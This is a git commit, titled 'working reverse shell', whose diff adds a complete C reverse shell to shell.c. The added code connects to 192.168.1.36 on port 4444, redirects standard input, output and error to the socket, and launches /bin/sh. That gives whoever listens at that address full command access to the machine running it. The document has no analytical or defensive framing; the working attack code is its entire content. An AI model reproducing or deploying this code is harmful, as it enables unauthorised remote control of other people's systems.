548bae995cd2b7c92ab11c01ff5d9bd3302f7b2b
Nate <ntuckertriplet@gmail.com>
2019-05-29 13:13:45 +0000

    working reverse shell

--- shell.c
+++ shell.c
@@ -6,8 +6,24 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-int main(int argc, char *argv[]){
+int main(void){
+	int sockt;
+	int port = 4444;
+	struct sockaddr_in revsockaddr;
+
+	sockt = socket(AF_INET, SOCK_STREAM, 0);
+	revsockaddr.sin_family = AF_INET;
+	revsockaddr.sin_port = htons(port);
+	revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.36");
+
+	connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
 	
+	dup2(sockt, 0);
+	dup2(sockt, 1);
+	dup2(sockt, 2);
+
+	char * const argv[] = {"/bin/sh", NULL};
+	execve("/bin/sh", argv, NULL);	
 
 	return 0;
 }
